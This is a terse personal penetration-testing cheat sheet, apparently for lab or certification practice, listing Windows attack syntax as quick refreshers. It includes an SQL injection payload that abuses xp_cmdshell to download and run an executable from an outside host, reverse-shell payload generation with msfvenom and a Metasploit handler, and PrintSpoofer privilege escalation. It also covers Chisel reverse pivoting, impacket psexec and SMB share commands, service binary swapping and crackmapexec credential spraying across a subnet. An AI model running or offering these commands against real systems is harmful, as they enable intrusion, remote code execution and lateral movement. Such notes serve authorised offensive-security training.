Big Book: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

I try to keep my notes as lean as possible. This is overall meant to be used as syntax refreshers.


SQL:

Upload:
test'; EXEC xp_cmdshell "powershell iwr -uri http://192.168.1.2/test.exe -outfile C:\\Users\Public\\payload.exe"-- 

Execute:
a' exec xp_cmdshell "powershell C:\\Users\\Public\\payload.exe"-- 
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Escelate Priv:

https://github.com/itm4n/PrintSpoofer | PrintSpoofer.exe -i -c cmd

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Metasploit Handler:

https://www.offsec.com/metasploit-unleashed/binary-payloads/ | use exploit/multi/handler | set payload windows/x64/shell_reverse_tcp


______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

MSFVenom:

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Chisel:

https://blog.mkiesel.ch/posts/oscp_pivoting/

chisel server --port PORT --socks5 --reverse

.\chisel.exe client --max-retry-count 1 IP:PORT R:socks

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Impacket (more like godpacket):

https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d

impacket-psexec domain/username:"pass"@IP

proxychains -q impacket-smbserver kali . -smb2support -user kali -password kali
net use P: \\192.168.45.191\kali /user:kali kali


______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Pesky Service Perms?
try rebooting computer, or stopping then starting, or restarting, or sc.exe start [servicename]
remember, you can try doing a dll hijack, or you can try the easy way and just swap the exe.

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

crackmapexec:
crackmapexec smb/winrm/ldap/rdp/ftp/mssql/ssh 172.16.199.0/24 -u 'user' -p 'pass'
